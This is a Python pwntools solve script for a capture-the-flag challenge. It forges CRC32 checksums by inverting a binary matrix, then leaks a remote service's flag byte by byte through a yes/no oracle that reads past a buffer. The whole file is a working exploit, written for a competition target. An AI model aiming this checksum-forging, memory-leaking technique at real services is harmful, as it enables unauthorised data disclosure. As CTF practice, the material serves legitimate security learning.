#!/usr/bin/env python3

import numpy, binascii, struct, zlib
import pwn
pwn.context.log_level = 'debug'
#pwn.logging.getLogger("pwnlib.tubes.remote").setLevel('WARNING')


REMOTE_ADDR = 'comms.martiansonly.net'
REMOTE_PORT = 1234

def int_to_bin_arr(value, sz=32):
    """
    Convert an integer value to a binary array of size `sz`.

    Args:
        value (int): The integer value to convert.
        sz (int, optional): The size of the binary array. Defaults to 32.

    Returns:
        numpy.array: The binary array representation of the input value.
    """
    return numpy.array([int(bit) for bit in f'{value:0{sz}b}'[::-1]])

def bin_arr_to_int(value):
    """
    Convert a binary array to an integer value.

    Args:
        value (numpy.array): The binary array to convert.

    Returns:
        int: The integer value represented by the binary array.
    """
    return int(''.join(str(x) for x in value)[::-1], 2)

def append_identity(arr):
    """
    Append an identity matrix to the right of a given matrix.

    Args:
        arr (numpy.array): The matrix to which the identity matrix is appended.

    Returns:
        numpy.array: The matrix with the identity matrix appended.
    """
    return numpy.concatenate((arr, numpy.identity(arr.shape[0], dtype=int)), axis=1)

def xor_rows(matrix, dst, src):
    """
    Perform bitwise XOR operation between two rows of a matrix.

    Args:
        matrix (numpy.array): The matrix containing the rows.
        dst (int): The index of the destination row.
        src (int): The index of the source row.
    """
    matrix[dst] = matadd(matrix[dst], matrix[src])

def set_identity_one(matrix, start_idx):
    """
    Set the diagonal element at start_idx to 1, and clear all other elements in the same column.

    Args:
        matrix (numpy.array): The matrix to perform the operation on.
        start_idx (int): The index of the diagonal element to set to 1.
    """
    is_set = (matrix[start_idx][start_idx] == 1)

    for src_idx in range(start_idx + 1, matrix.shape[0]):
        if matrix[src_idx][start_idx] == 1:
            if not is_set:
                xor_rows(matrix, start_idx, src_idx)
            is_set = True
            xor_rows(matrix, src_idx, start_idx)

    if not is_set:
        print(matrix)
        raise Exception(f"no one in column {start_idx} available")

def clear_over_one(matrix, start_idx):
    """
    Clear all elements above the diagonal element at start_idx in the same column.

    Args:
        matrix (numpy.array): The matrix to perform the operation on.
        start_idx (int): The index of the diagonal element.
    """
    for src_idx in range(0, start_idx):
        if matrix[src_idx][start_idx] == 1:
            xor_rows(matrix, src_idx, start_idx)

def gaussian_elimination_inverse(matrix):
    """
    Compute the inverse of a binary matrix using Gaussian elimination.
    That is to say, find a Minv such that Minv * M == I

    Args:
        matrix (numpy.array): The binary matrix.

    Returns:
        numpy.array: The inverse of the input matrix.
    """
    M = append_identity(matrix.copy())
    for i in range(matrix.shape[0]):
        set_identity_one(M, i)
        clear_over_one(M, i)
    I, Minv = numpy.hsplit(M, 2)
    assert(numpy.array_equal(I, numpy.identity(matrix.shape[0], dtype=int)))
    return Minv

def matmul(matrix1, matrix2):
    """
    Perform matrix multiplication modulo 2.

    Args:
        matrix1 (numpy.array): The first matrix.
        matrix2 (numpy.array): The second matrix.

    Returns:
        numpy.array: The result of matrix multiplication modulo 2.
    """
    return numpy.matmul(matrix1, matrix2) % 2

def matadd(matrix1, matrix2):
    """
    Perform element-wise addition modulo 2.
    This works the same as xor and subtraction under (modulo 2).

    Args:
        matrix1 (numpy.array): The first matrix.
        matrix2 (numpy.array): The second matrix.

    Returns:
        numpy.array: The result of element-wise addition modulo 2.
    """
    return (matrix1 + matrix2) % 2

def crc32(free_bytes, prefix, postfix):
    """
    Calculate the CRC32 checksum consistent with the challenge problem.

    Args:
        free_bytes (int): The bytes we're manipulating (as an integer).
        prefix (bytes): The prefix to prepend to the free_bytes.
        postfix (bytes): The postfix to append to the free_bytes.

    Returns:
        numpy.array: The CRC32 checksum of the free_bytes with the prefix and postfix.
    """
    int_crc = zlib.crc32(prefix + struct.pack("<I", free_bytes) + postfix)
    return int_to_bin_arr(int_crc)

def build_matrix(prefix, postfix):
    """
    Build a matrix based on a given prefix and postfix.
    Each row of the resulting matrix comes from taking the respective
        rows of the identity matrix and using them as the `free_bytes`
        in the crc32 function.

    Args:
        prefix (bytes): The prefix to use.
        postfix (bytes): The postfix to use.

    Returns:
        numpy.array: The built matrix.
    """
    base = crc32(0, prefix, postfix)

    # Build a matrix of (crc(row) + base) for each row in the identity matrix
    matrix = numpy.array([
        matadd(crc32(1 << i, prefix, postfix), base)
        for i in range(32)
    ])

    return matrix, base

def calculate_free_bytes(target, prefix, postfix):
    """
    Calculate what `free_bytes` must be such that crc32 returns `target`
    Use the matrix equation: (y-b)Minv = x where y is the `target`, b is the `base`, 
        Minv is the inverse of `build_matrix()` and x is the resulting `free_bytes`.

    Args:
        target (int): What the CRC should be after manipulating the free bytes.
        prefix (bytes): The data CRC'd before the free bytes.
        postfix (bytes): The data CRC'd after the free bytes.

    Returns:
        int: The value of `free_bytes` that makes the desired CRC output.
    """
    matrix, base = build_matrix(prefix, postfix)
    matrix_inverse = gaussian_elimination_inverse(matrix)

    target_arr = int_to_bin_arr(target)
    target_inv = matmul(matadd(target_arr, base), matrix_inverse)
    target_inv_int = bin_arr_to_int(target_inv)

    # Just make sure the inverse works as we claim
    check_val = bin_arr_to_int(crc32(target_inv_int, prefix, postfix))
    assert check_val == target

    return target_inv_int

def send_guess_to_remote(size,fill):
    pwn.debug(f"size={size}")
    payload = struct.pack("<B", size)
    payload += struct.pack("<I", fill)

    r = pwn.remote(REMOTE_ADDR, REMOTE_PORT)
    r.send(payload)

    response = b''
    try:
        response = r.recv(4)
    except EOFError:
        pass
    finally:
        r.close()

    return response == b'yup\n'


def leak_character(pad_len=0, leaked=b''):
    # | 4 free bytes | pad bytes | some leaked bytes | 4 crc bytes |
    for guess_byte in range(255):
        guess_byte = struct.pack("<B", guess_byte)
        postfix = b'\x00'*pad_len + leaked + guess_byte
        free_bytes = calculate_free_bytes(0, b'', postfix)
        if send_guess_to_remote(4+len(postfix), free_bytes):
            return guess_byte
    else:
        print(f"pad_len={pad_len}, leaked={leaked}")
        raise(Exception("couldn't find byte"))

def leak_flag():
    # find the offset of the flag in our buffer
    for offset in range(255-4-1):
        pwn.debug(f"offset={offset}")
        leaked_value = leak_character(pad_len=offset)
        if leaked_value != b'\x00':
            break
    else:
        raise(Exception("unable to find non-zero byte"))

    # leak the bytes where there is some padding and some flag bytes
    pwn.info(f'offset={offset:d} value={leaked_value}')
    leaked_string = leaked_value
    for idx in range(255-offset-4-1):
        leaked_string += leak_character(
            offset,
            leaked_string)
        pwn.info(leaked_string)

    print(leaked_string)

if __name__ == "__main__":
    leak_flag()
